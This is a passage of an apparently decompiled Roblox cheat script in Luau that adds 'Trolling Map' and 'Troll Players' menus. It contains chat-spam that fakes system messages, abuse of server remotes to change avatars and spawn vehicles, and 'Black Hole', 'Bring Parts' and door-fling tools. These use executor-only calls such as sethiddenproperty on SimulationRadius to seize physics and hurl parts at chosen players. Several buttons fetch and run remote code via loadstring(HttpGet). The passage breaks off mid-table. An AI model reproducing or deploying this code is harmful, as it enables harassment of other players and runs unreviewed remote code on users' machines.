            t3.value11 = {}

            for _, child in ipairs(t3.value12:GetChildren()) do
                child:Destroy()
            end

            for _ = 1, t3.value13 do
                v277()
            end

            t3.value17:Play()

            return
        end

        if not v1036 and t3.value10 then
            t3.value10 = false
            for v1044, v1045 in ipairs(t3.value11) do

                if v1045 and v1045.Parent then
                    v1045:Destroy()
                end
            end
            for _, child in ipairs(t3.value12:GetChildren()) do
                child:Destroy()
            end
            t3.value17:Stop()
            t3.value2.FogColor = Color3.fromRGB(192, 192, 192)
            t3.value2.FogEnd = 100000
            t3.value2.Brightness = 2
        end
    end

    task.spawn(function()
        while true do
            if t3.value10 then
                for _ = 1, t3.value15 do
                    v278()
                    task.wait(t3.value16)
                end
            else
                task.wait(1)
            end
        end
    end)
    task.spawn(function()
        while true do
            v279()
            task.wait(1)
        end
    end)
    t3.value18 = Instance.new("Folder", t3.value1)
    t3.value18.Name = "FakeRain"
    t3.value19 = false
    t3.value20 = Instance.new("Sound", SoundService)
    t3.value20.SoundId = "rbxassetid://9111139882"
    t3.value20.Volume = 0.2
    t3.value20.Looped = true
    t3.value20:Play()

    local Sound3 = Instance.new("Sound", SoundService)

    Sound3.SoundId = "rbxassetid://9118823106"
    Sound3.Volume = 0.3
    Sound3.Looped = true
    Sound3:Play()
    t3.value21 = Instance.new("Sound", SoundService)
    t3.value21.SoundId = "rbxassetid://9120018695"
    t3.value21.Volume = 0.4

    function t3.value22()
        t3.value20.Volume = not t3.value19 and 0.2 or 0
    end

    local function v281()
        t3.value22()

        for _ = 1, 120 do
            local Part4 = Instance.new("Part")

            Part4.Size = Vector3.new(0.1, 2, 0.1)
            Part4.Anchored = true
            Part4.CanCollide = false
            Part4.Material = Enum.Material.Glass
            Part4.Transparency = 0.5
            Part4.Color = Color3.fromRGB(160, 160, 255)
            Part4.Position = Vector3.new(math.random(-150, 150), 100, math.random(-150, 150))
            Part4.Parent = t3.value18
            t3.value5:Create(Part4, TweenInfo.new(1), {
                    Position = Part4.Position - Vector3.new(0, 60, 0)
                }):Play()
            t3.value4:AddItem(Part4, 1.5)
        end

        wait(1.5)
        t3.value22()
    end
    local function v282()
        local Part5 = Instance.new("Part")

        Part5.Size = Vector3.new(1, 1000, 1)
        Part5.Anchored = true
        Part5.CanCollide = false
        Part5.Transparency = 0.4
        Part5.Material = Enum.Material.Neon
        Part5.Color = Color3.new(1, 1, 1)
        Part5.Position = Vector3.new(math.random(-100, 100), 500, math.random(-100, 100))
        Part5.Parent = t3.value1
        t3.value2.Brightness = t3.value2.Brightness + 1.5
        t3.value21:Play()
        wait(0.1)
        t3.value2.Brightness = t3.value2.Brightness - 1.5
        Part5:Destroy()
    end

    for _, descendant in pairs(t3.value1:GetDescendants()) do
        if descendant:IsA("BasePart") and descendant.Material == Enum.Material.SmoothPlastic then
            descendant.Reflectance = 0.25
        end
    end

    task.spawn(function()
        while true do
            v281()

            if math.random() < 0.2 then
                v282()
            end

            wait(1)
        end
    end)
    t3.value2.Brightness = 2
    t3.value2.GlobalShadows = true
    t3.value2.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
    t3.value2.FogColor = Color3.fromRGB(120, 130, 140)
    t3.value2.FogStart = 80
    t3.value2.FogEnd = 600
    t3.value2.EnvironmentSpecularScale = 1
    t3.value2.EnvironmentDiffuseScale = 0.5

    local Sky = Instance.new("Sky")

    Sky.SkyboxBk = "rbxassetid://159454299"
    Sky.SkyboxDn = "rbxassetid://159454296"
    Sky.SkyboxFt = "rbxassetid://159454293"
    Sky.SkyboxLf = "rbxassetid://159454286"
    Sky.SkyboxRt = "rbxassetid://159454300"
    Sky.SkyboxUp = "rbxassetid://159454304"
    Sky.Parent = t3.value2

    local ColorCorrectionEffect = Instance.new("ColorCorrectionEffect", t3.value2)

    ColorCorrectionEffect.Brightness = 0.03
    ColorCorrectionEffect.Contrast = 0.15
    ColorCorrectionEffect.Saturation = 0.05
    ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 240, 220)

    local BloomEffect = Instance.new("BloomEffect", t3.value2)

    BloomEffect.Intensity = 0.8
    BloomEffect.Size = 56
    BloomEffect.Threshold = 0.9

    local SunRaysEffect = Instance.new("SunRaysEffect", t3.value2)

    SunRaysEffect.Intensity = 0.05
    SunRaysEffect.Spread = 0.8
    Instance.new("BlurEffect", t3.value2).Size = 0
end
})
local v27 = t1.value19:MakeTab({
    "Trolling Map",
    "map"
})
v27:AddSection({ "Skybox by Dazzy" })

local t5 = {
    Name = "Skybox by Dazzy",
    Callback = function()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/qZkSict1retkqFIr/raw"))()
end
}
t1.value22 = nil
t1.value23 = nil
v27:AddButton(t5)
t1.value24 = false
t1.value22 = nil
t1.value23 = nil
t1.value25 = {}
function t1.value26()
    if t1.value23 then
        pcall(function()
            t1.value23:Stop()
            t1.value23:Destroy()
        end)
        t1.value23 = nil
    end

    if t1.value22 then
        pcall(function()
            t1.value22:Stop()
            t1.value22:Destroy()
        end)
        t1.value22 = nil
    end

    local Character = game.Players.LocalPlayer.Character

    if Character then
        local Humanoid = Character:FindFirstChild("Humanoid")

        if Humanoid then
            local Animator = Humanoid:FindFirstChild("Animator")

            if Animator then
                for _, v in pairs(Animator:GetPlayingAnimationTracks()) do
                    local v294 = v

                    if v294.Animation then
                        local AnimationId = v294.Animation.AnimationId

                        if AnimationId == "rbxassetid://70883871260184" or AnimationId == "rbxassetid://3695333486" then
                            pcall(function()
                                v294:Stop()
                            end)
                        end
                    end
                end
            end
        end
    end
end
v27:AddToggle({
    Name = "Nuke by Frost",
    Default = false,
    Callback = function(p11)
    t1.value24 = p11

    if p11 then
        local Character = game.Players.LocalPlayer.Character

        if Character then
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then
                local AppliedDescription = Humanoid:GetAppliedDescription()
                local Torso = AppliedDescription.Torso
                local RightArm = AppliedDescription.RightArm
                local LeftArm = AppliedDescription.LeftArm
                local RightLeg = AppliedDescription.RightLeg
                local LeftLeg = AppliedDescription.LeftLeg
                local Head = AppliedDescription.Head

                t1.value25 = {
                        Torso = Torso,
                        RightArm = RightArm,
                        LeftArm = LeftArm,
                        RightLeg = RightLeg,
                        LeftLeg = LeftLeg,
                        Head = Head
                    }
                task.wait(0.2)

                local t6 = {
                        [1] = 123402086843880,
                        [2] = 100839513065430,
                        [3] = 78300682916056,
                        [4] = 86276701020724,
                        [5] = 78409653958165,
                        [6] = 15093053680
                    }

                pcall(function()
                    game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(t6)
                end)
                task.wait(0.3)

                local Animation = Instance.new("Animation")

                Animation.AnimationId = "rbxassetid://70883871260184"
                t1.value22 = Humanoid:LoadAnimation(Animation)
                t1.value22.Priority = Enum.AnimationPriority.Action4
                t1.value22:Play(0.1, 1, 0.01)
                task.wait(0.5)

                local Animation2 = Instance.new("Animation")

                Animation2.AnimationId = "rbxassetid://3695333486"
                t1.value23 = Humanoid:LoadAnimation(Animation2)
                t1.value23.Priority = Enum.AnimationPriority.Movement
                t1.value23:Play(0.1, 1, 0)

                return
            end
        end
    else
        t1.value26()
        task.wait(0.2)

        if next(t1.value25) then
            local Character = game.Players.LocalPlayer.Character

            if Character and Character:FindFirstChildOfClass("Humanoid") then
                local Torso = t1.value25.Torso
                local RightArm = t1.value25.RightArm
                local LeftArm = t1.value25.LeftArm
                local RightLeg = t1.value25.RightLeg
                local LeftLeg = t1.value25.LeftLeg
                local Head = t1.value25.Head
                local t7 = {
                        [1] = {
                            [1] = Torso,
                            [2] = RightArm,
                            [3] = LeftArm,
                            [4] = RightLeg,
                            [5] = LeftLeg,
                            [6] = Head
                        }
                    }

                pcall(function()
                    local ChangeCharacterBody = game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody
                    local t8 = { unpack(t7) }

                    ChangeCharacterBody:InvokeServer(v2(t8))
                end)
            end
        end
    end
end
})
t1.value27 = false
t1.value28 = nil
t1.value29 = nil
t1.value29 = nil
t1.value28 = nil
t1.value30 = {}
function t1.value31()
    if t1.value28 then
        pcall(function()
            t1.value28:Stop()
            t1.value28:Destroy()
        end)
        t1.value28 = nil
    end

    if t1.value29 then
        pcall(function()
            t1.value29:Stop()
            t1.value29:Destroy()
        end)
        t1.value29 = nil
    end
end
v27:AddToggle({
    Name = "Nuke FlashBack by Frost",
    Default = false,
    Callback = function(p12)
    t1.value27 = p12

    if p12 then
        local Character = game.Players.LocalPlayer.Character

        if Character then
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then
                local AppliedDescription = Humanoid:GetAppliedDescription()
                local Torso = AppliedDescription.Torso
                local RightArm = AppliedDescription.RightArm
                local LeftArm = AppliedDescription.LeftArm
                local RightLeg = AppliedDescription.RightLeg
                local LeftLeg = AppliedDescription.LeftLeg
                local Head = AppliedDescription.Head

                t1.value30 = {
                        Torso = Torso,
                        RightArm = RightArm,
                        LeftArm = LeftArm,
                        RightLeg = RightLeg,
                        LeftLeg = LeftLeg,
                        Head = Head
                    }
                task.wait(0.2)

                local t9 = {
                        [1] = 123402086843880,
                        [2] = 100839513065430,
                        [3] = 78300682916056,
                        [4] = 86276701020724,
                        [5] = 78409653958165,
                        [6] = 15093053680
                    }

                pcall(function()
                    game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(t9)
                end)
                task.wait(0.3)

                local Animation = Instance.new("Animation")

                Animation.AnimationId = "rbxassetid://70883871260184"
                t1.value29 = Humanoid:LoadAnimation(Animation)
                t1.value29.Priority = Enum.AnimationPriority.Action4
                t1.value29:Play(0.1, 1, 1)
                task.wait(0.1)
                t1.value29:AdjustSpeed(5)
                task.wait(0.3)

                local Animation3 = Instance.new("Animation")

                Animation3.AnimationId = "rbxassetid://3695333486"
                t1.value28 = Humanoid:LoadAnimation(Animation3)
                t1.value28.Priority = Enum.AnimationPriority.Movement
                t1.value28:Play(0.1, 1, 0)

                return
            end
        end
    else
        t1.value31()
        task.wait(0.2)

        if next(t1.value30) then
            local Character = game.Players.LocalPlayer.Character

            if Character and Character:FindFirstChildOfClass("Humanoid") then
                local Torso = t1.value30.Torso
                local RightArm = t1.value30.RightArm
                local LeftArm = t1.value30.LeftArm
                local RightLeg = t1.value30.RightLeg
                local LeftLeg = t1.value30.LeftLeg
                local Head = t1.value30.Head
                local t10 = {
                        [1] = {
                            [1] = Torso,
                            [2] = RightArm,
                            [3] = LeftArm,
                            [4] = RightLeg,
                            [5] = LeftLeg,
                            [6] = Head
                        }
                    }

                pcall(function()
                    game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(t10))
                end)
            end
        end
    end
end
})
v27:AddSection({ "Natural Disasters" })
v27:AddButton({
    Name = "[OP] Tornado - Pirate Ship (Large)",
    Callback = function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local TextChatService = game:GetService("TextChatService")
    local LocalPlayer3 = game.Players.LocalPlayer
    local v342 = LocalPlayer3.Character or LocalPlayer3.CharacterAdded:Wait()
    local Humanoid = v342:WaitForChild("Humanoid")
    local HumanoidRootPart = v342:WaitForChild("HumanoidRootPart")
    local Vehicles = workspace:WaitForChild("Vehicles")

    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.TextChannels.RBXGeneral:SendAsync("hi\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\rTornado has appeared! Be careful...")
    end

    local v346 = (function()
        HumanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        ReplicatedStorage:WaitForChild("RE"):FindFirstChild("1Ca1r"):FireServer("PickingBoat", "PirateFree")
        task.wait(1)

        return Vehicles:FindFirstChild(LocalPlayer3.Name .. "Car")
    end)()

    if not v346 then
        return
    end

    local v347 = v346:FindFirstChild("Body") and v346.Body:FindFirstChild("VehicleSeat")

    if not v347 then
        return
    end

    if v347 ~= Humanoid.SeatPart then
    end

    repeat
        task.wait(0.1)
        HumanoidRootPart.CFrame = v347.CFrame * CFrame.new(0, 1, 0)
    until v347 == Humanoid.SeatPart

    task.spawn(function()
        local t11 = {
                [1] = workspace,
                [2] = 9068077052,
                [3] = 1
            }

        for _ = 1, 5 do
            local v1056 = ReplicatedStorage.RE:FindFirstChild("1Gu1nSound1s")
            local t12 = { unpack(t11) }

            v1056:FireServer(v2(t12))

            local Sound = Instance.new("Sound")

            Sound.SoundId = "rbxassetid://" .. tostring(9068077052)
            Sound.Parent = LocalPlayer3.Character and LocalPlayer3.Character:FindFirstChild("HumanoidRootPart")

            if not Sound.Parent then
                return
            end

            Sound:Play()
            task.wait(1.5)
            Sound:Destroy()
        end
    end)
    task.delay(4, function()
        if Humanoid.SeatPart then
            Humanoid.Sit = false
        end

        HumanoidRootPart.CFrame = CFrame.new(0, 0, 0)
    end)

    local v348 = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r")

    task.spawn(function()
        while v346 and v346.Parent do
            v348:FireServer("Flip")
            task.wait(0.5)
        end
    end)

    local vector3 = Vector3.new(-16, 0, -47)
    local vector3_2 = Vector3.new(-110, 0, -45)
    local t13 = { Vector3.new(16, 0, -55) }
    local t14 = {
            vector3,
            vector3_2,
            v2(t13)
        }
    local n3 = 12.566370614359172
    local n4 = 0
    local n5 = 0

    RunService.Heartbeat:Connect(function(dt)
        if not v346 or not v346.PrimaryPart then
            return
        end

        local v1063 = t14[1]
        local v1064 = t14[2]
        local v1065 = 15 * dt / (v1063 - v1064).Magnitude

        n4 = n4 + v1065

        if n4 >= 1 then
            n4 = 0

            local _ = 2 % #t14 + 1
        end

        local p = CFrame.new(v1063):lerp(CFrame.new(v1064), n4).p
        local v1068 = n3 * dt

        n5 = n5 + v1068

        local v1069 = CFrame.new(p) * CFrame.Angles(0, n5, 0)

        v346:SetPrimaryPartCFrame(v1069)
    end)
end
})
v27:AddButton({
    Name = "Cancel Tornado",
    Callback = function()
    local success = pcall(function()
        local v1070 = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r")
        local t15 = { unpack({ "DeleteAllVehicles" }) }

        v1070:FireServer(v2(t15))
    end)
    if success then
    end
end
})
v27:AddSection({ "Others" })
v27:AddButton({
    Name = "Black Hole",
    Description = "Activating this pulls Parts to your character",
    Callback = function()
    local Players2 = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer4 = Players2.LocalPlayer
    local Workspace = game:GetService("Workspace")
    local n6 = 1
    local n7 = 10
    local u364 = false

    local function v365()
        local HumanoidRootPart = (LocalPlayer4.Character or LocalPlayer4.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
        local Folder = Instance.new("Folder", Workspace)
        local Part = Instance.new("Part", Folder)
        local Attachment = Instance.new("Attachment", Part)

        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 1

        return HumanoidRootPart, Attachment
    end

    local v366, v367 = v365()
    local v368 = v366
    local v369 = v367

    if not getgenv().Network then
        local v370 = getgenv()
        local vector3 = Vector3.new(14.46262424, 14.46262424, 14.46262424)

        v370.Network = {
                BaseParts = {},
                Velocity = vector3
            }

        function Network.RetainPart(p13)
            local v1077 = typeof(p13) == "Instance"

            if v1077 then
                v1077 = p13:IsA("BasePart")

                if v1077 then
                    v1077 = p13:IsDescendantOf(Workspace)
                end
            end

            if v1077 then
                table.insert(Network.BaseParts, p13)
                p13.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
                p13.CanCollide = false
            end
        end

        LocalPlayer4.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer4, "SimulationRadius", 1e999)

            for _, v in pairs(Network.BaseParts) do
                if v:IsDescendantOf(Workspace) then
                    v.Velocity = Network.Velocity
                end
            end
        end)
    end

    local function v372(p14)
        local v1081 = p14:IsA("Part")

        if v1081 then
            v1081 = not p14.Anchored

            if v1081 then
                v1081 = not p14.Parent:FindFirstChild("Humanoid") and (not p14.Parent:FindFirstChild("Head") and p14.Name ~= "Handle")
            end
        end

        if v1081 then
            local _next = next
            local v1083, v1084 = p14:GetChildren()

            while true do
                local v1085

                v1084, v1085 = _next(v1083, v1084)

                if not v1084 then
                    break
                end

                local v1086 = v1085:IsA("BodyAngularVelocity")

                if not v1086 then
                    v1086 = v1085:IsA("BodyForce")

                    if not v1086 then
                        v1086 = v1085:IsA("BodyGyro")

                        if not v1086 then
                            v1086 = v1085:IsA("BodyPosition")

                            if not v1086 then
                                v1086 = v1085:IsA("BodyThrust") or (v1085:IsA("BodyVelocity") or v1085:IsA("RocketPropulsion"))
                            end
                        end
                    end
                end

                if v1086 then
                    v1085:Destroy()
                end
            end

            if p14:FindFirstChild("Attachment") then
                p14:FindFirstChild("Attachment"):Destroy()
            end

            if p14:FindFirstChild("AlignPosition") then
                p14:FindFirstChild("AlignPosition"):Destroy()
            end

            if p14:FindFirstChild("Torque") then
                p14:FindFirstChild("Torque"):Destroy()
            end

            p14.CanCollide = false

            local Torque = Instance.new("Torque", p14)

            Torque.Torque = Vector3.new(1000000, 1000000, 1000000)

            local AlignPosition = Instance.new("AlignPosition", p14)
            local Attachment = Instance.new("Attachment", p14)

            Torque.Attachment0 = Attachment
            AlignPosition.MaxForce = 1e999
            AlignPosition.MaxVelocity = 1e999
            AlignPosition.Responsiveness = 500
            AlignPosition.Attachment0 = Attachment
            AlignPosition.Attachment1 = v369
        end
    end
    local function v373()
        u364 = not u364

        if u364 then
            local _next = next
            local v1091, v1092 = Workspace:GetDescendants()

            while true do
                local v1093

                v1092, v1093 = _next(v1091, v1092)

                if not v1092 then
                    break
                end

                v372(v1093)
            end

            Workspace.DescendantAdded:Connect(function(descendant)
                if u364 then
                    v372(descendant)
                end
            end)
            spawn(function()
                while u364 and RunService.RenderStepped:Wait() do
                    n6 = n6 + 0.03490658503988659

                    local v1340 = math.cos(n6)
                    local _math = math
                    local v1342 = v1340 * n7
                    local v1343 = _math.sin(n6) * n7

                    v369.WorldCFrame = v368.CFrame * CFrame.new(v1342, 0, v1343)
                end
            end)

            return
        end

        v369.WorldCFrame = CFrame.new(0, -1000, 0)
    end

    LocalPlayer4.CharacterAdded:Connect(function()
        local _, _ = v365()

        if u364 then
            v373()
        end
    end)

    local v374 = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))():Window("Black Hole")

    v374:Slider("Radius Black Hole", 1, 100, 10, function(p15)
        n7 = p15
    end)
    v374:Toggle("Toggle Black Hole", true, function(p16)
        if p16 then
            v373()

            return
        end

        u364 = false
    end)
    spawn(function()
        while true do
            RunService.RenderStepped:Wait()

            if u364 then
                n6 = n6 + math.rad(angleSpeed)
            end
        end
    end)
    v373()
end
})
v27:AddButton({
    Name = "Bring Parts",
    Description = "To use, approach the Selected Player",
    Callback = function()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextBox = Instance.new("TextBox")
    local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
    local TextLabel = Instance.new("TextLabel")
    local UITextSizeConstraint2 = Instance.new("UITextSizeConstraint")
    local TextButton = Instance.new("TextButton")
    local UITextSizeConstraint3 = Instance.new("UITextSizeConstraint")
    ScreenGui.Name = "Gui"
    ScreenGui.Parent = gethui()
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Frame.Name = "Main"
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.335954279, 0, 0.542361975, 0)
    Frame.Size = UDim2.new(0.240350261, 0, 0.166880623, 0)
    Frame.Active = true
    Frame.Draggable = true
    TextBox.Name = "Box"
    TextBox.Parent = Frame
    TextBox.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
    TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextBox.BorderSizePixel = 0
    TextBox.Position = UDim2.new(0.0980926454, 0, 0.218712583, 0)
    TextBox.Size = UDim2.new(0.801089942, 0, 0.364963502, 0)
    TextBox.FontFace = Font.new("rbxasset://fonts/families/SourceSansSemibold.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
    TextBox.PlaceholderText = "Player Name..."
    TextBox.Text = ""
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.TextScaled = true
    TextBox.TextSize = 31
    TextBox.TextWrapped = true
    UITextSizeConstraint.Parent = TextBox
    UITextSizeConstraint.MaxTextSize = 31
    TextLabel.Name = "Label"
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.BorderSizePixel = 0
    TextLabel.Size = UDim2.new(1, 0, 0.160583943, 0)
    TextLabel.FontFace = Font.new("rbxasset://fonts/families/Nunito.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
    TextLabel.Text = "Bring Parts"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14
    TextLabel.TextWrapped = true
    UITextSizeConstraint2.Parent = TextLabel
    UITextSizeConstraint2.MaxTextSize = 21
    TextButton.Name = "Button"
    TextButton.Parent = Frame
    TextButton.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
    TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextButton.BorderSizePixel = 0
    TextButton.Position = UDim2.new(0.183284417, 0, 0.656760991, 0)
    TextButton.Size = UDim2.new(0.629427791, 0, 0.277372271, 0)
    TextButton.Font = Enum.Font.Nunito
    TextButton.Text = "Bring Parts (Off)"
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextScaled = true
    TextButton.TextSize = 28
    TextButton.TextWrapped = true
    UITextSizeConstraint3.Parent = TextButton
    UITextSizeConstraint3.MaxTextSize = 28
    local Players3 = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer5 = Players3.LocalPlayer
    local UserInputService = game:GetService("UserInputService")
    local Workspace = game:GetService("Workspace")
    local u388
    mainStatus = true
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.RightControl and not gameProcessed then
            mainStatus = not mainStatus
            Frame.Visible = mainStatus
        end
    end)
    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1
    if not getgenv().Network then
        local v392 = getgenv()
        local vector3 = Vector3.new(14.46262424, 14.46262424, 14.46262424)

        v392.Network = {
                BaseParts = {},
                Velocity = vector3
            }

        function Network.RetainPart(p17)
            local v1101 = p17:IsA("BasePart")

            if v1101 then
                v1101 = p17:IsDescendantOf(Workspace)
            end

            if v1101 then
                table.insert(Network.BaseParts, p17)
                p17.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
                p17.CanCollide = false
            end
        end

        LocalPlayer5.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer5, "SimulationRadius", 1e999)

            for _, v in pairs(Network.BaseParts) do
                if v:IsDescendantOf(Workspace) then
                    v.Velocity = Network.Velocity
                end
            end
        end)
    end
    local function v394(p18)
        local v1105 = p18:IsA("BasePart")

        if v1105 then
            v1105 = not p18.Anchored

            if v1105 then
                v1105 = not p18.Parent:FindFirstChildOfClass("Humanoid") and (not p18.Parent:FindFirstChild("Head") and p18.Name ~= "Handle")
            end
        end

        if v1105 then
            for _, child in ipairs(p18:GetChildren()) do
                if child:IsA("BodyMover") or child:IsA("RocketPropulsion") then
                    child:Destroy()
                end
            end

            if p18:FindFirstChild("Attachment") then
                p18:FindFirstChild("Attachment"):Destroy()
            end

            if p18:FindFirstChild("AlignPosition") then
                p18:FindFirstChild("AlignPosition"):Destroy()
            end

            if p18:FindFirstChild("Torque") then
                p18:FindFirstChild("Torque"):Destroy()
            end

            p18.CanCollide = false

            local Torque = Instance.new("Torque", p18)

            Torque.Torque = Vector3.new(100000, 100000, 100000)

            local AlignPosition = Instance.new("AlignPosition", p18)
            local Attachment4 = Instance.new("Attachment", p18)

            Torque.Attachment0 = Attachment4
            AlignPosition.MaxForce = 1e999
            AlignPosition.MaxVelocity = 1e999
            AlignPosition.Responsiveness = 200
            AlignPosition.Attachment0 = Attachment4
            AlignPosition.Attachment1 = Attachment
        end
    end
    local u395 = false
    local connection
    local function v397()
        u395 = not u395

        if u395 then
            TextButton.Text = "Bring Parts (On)"

            for _, descendant in ipairs(Workspace:GetDescendants()) do
                v394(descendant)
            end

            connection = Workspace.DescendantAdded:Connect(function(descendant)
                if u395 then
                    v394(descendant)
                end
            end)
            spawn(function()
                while u395 and RunService.RenderStepped:Wait() do
                    Attachment.WorldCFrame = (nil).CFrame
                end
            end)

            return
        end

        TextButton.Text = "Bring Parts (Off)"

        if connection then
            connection:Disconnect()
        end
    end
    local function v398(p19)
        local v1114 = string.lower(p19)

        for _, player in pairs(Players3:GetPlayers()) do
            local v1117 = string.lower(player.Name)

            if string.find(v1117, v1114) then
                return player
            end

            if string.find(string.lower(player.DisplayName), v1114) then
                return player
            end
        end
    end
    local u399
    coroutine.wrap(function()
        Instance.new("Script", TextBox).Parent.FocusLost:Connect(function(enterPressed)
            if enterPressed then
                u399 = v398(TextBox.Text)

                if u399 then
                    TextBox.Text = u399.Name
                end
            end
        end)
    end)()
    coroutine.wrap(function()
        Instance.new("Script", TextButton).Parent.MouseButton1Click:Connect(function()
            if u399 then
                u388 = u399.Character or u399.CharacterAdded:Wait()
                u388:WaitForChild("HumanoidRootPart")
                v397()
            end
        end)
    end)()
end
})
local v29 = t1.value19:MakeTab({
    Title = "Troll Players",
    Icon = "user"
})
v29:AddSection({
    Name = "Troll Players"
})
v29:AddSection({
    Name = "Players"
})
game:GetService("Players")
game:GetService("Workspace")
game:GetService("RunService")

function DoorFlingPlayer(p20)
    local Players4 = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local LocalPlayer6 = Players4.LocalPlayer
    local HumanoidRootPart = (LocalPlayer6.Character or LocalPlayer6.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
    local t17 = {}
    local Part = Instance.new("Part")
    Part.Size = Vector3.new(100000, 100000, 100000)
    Part.Transparency = 1
    Part.Anchored = true
    Part.CanCollide = false
    Part.Name = "BlackHoleTarget"
    Part.Parent = Workspace
    local Attachment = Instance.new("Attachment")
    Attachment.Name = "Luscaa_BlackHoleAttachment"
    Attachment.Parent = Part
    RunService.Heartbeat:Connect(function()
        Part.CFrame = HumanoidRootPart.CFrame
    end)
    for _, descendant in ipairs(Workspace:GetDescendants()) do
        if descendant:IsA("BasePart") and string.find(descendant.Name, "Door") and (not descendant:FindFirstChild("Luscaa_Attached") and not descendant.Anchored) then
            descendant.CanCollide = false
            descendant.Transparency = 0

            for _, child in ipairs(descendant:GetChildren()) do
                if child:IsA("AlignPosition") or (child:IsA("Torque") or child:IsA("Attachment")) then
                    child:Destroy()
                end
            end

            Instance.new("BoolValue", descendant).Name = "Luscaa_Attached"

            local Attachment5 = Instance.new("Attachment", descendant)
            local AlignPosition = Instance.new("AlignPosition", descendant)

            AlignPosition.Attachment0 = Attachment5
            AlignPosition.Attachment1 = Attachment
            AlignPosition.MaxForce = 1E+20
            AlignPosition.MaxVelocity = 1e999
            AlignPosition.Responsiveness = 99999

            local Torque = Instance.new("Torque", descendant)

            Torque.Attachment0 = Attachment5
            Torque.RelativeTo = Enum.ActuatorRelativeTo.World
            Torque.Torque = Vector3.new(math.random(-1000000, 1000000) * 10000, math.random(-1000000, 1000000) * 10000, math.random(-1000000, 1000000) * 10000)
            table.insert(t17, {
                Part = descendant,
                Align = AlignPosition
            })
        end
    end
    Workspace.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("BasePart") and string.find(descendant.Name, "Door") and (not descendant:FindFirstChild("Luscaa_Attached") and not descendant.Anchored) then
            descendant.CanCollide = false

            local GetChildren = descendant.GetChildren

            descendant.Transparency = 0

            for _, v in ipairs(GetChildren(descendant)) do
                if v:IsA("AlignPosition") or (v:IsA("Torque") or v:IsA("Attachment")) then
                    v:Destroy()
                end
            end

            Instance.new("BoolValue", descendant).Name = "Luscaa_Attached"

            local Attachment6 = Instance.new("Attachment", descendant)
            local AlignPosition = Instance.new("AlignPosition", descendant)

            AlignPosition.Attachment0 = Attachment6
            AlignPosition.Attachment1 = Attachment
            AlignPosition.MaxForce = 1E+20
            AlignPosition.MaxVelocity = 1e999
            AlignPosition.Responsiveness = 99999

            local Torque = Instance.new("Torque", descendant)

            Torque.Attachment0 = Attachment6
            Torque.RelativeTo = Enum.ActuatorRelativeTo.World
            Torque.Torque = Vector3.new(math.random(-1000000, 1000000) * 10000, math.random(-1000000, 1000000) * 10000, math.random(-1000000, 1000000) * 10000)
            table.insert(t17, {
                Part = descendant,
                Align = AlignPosition
            })
        end
    end)
    local t18 = {
        Vector3.new(-128, 4, -147),
        Vector3.new(-63, 4, -146),
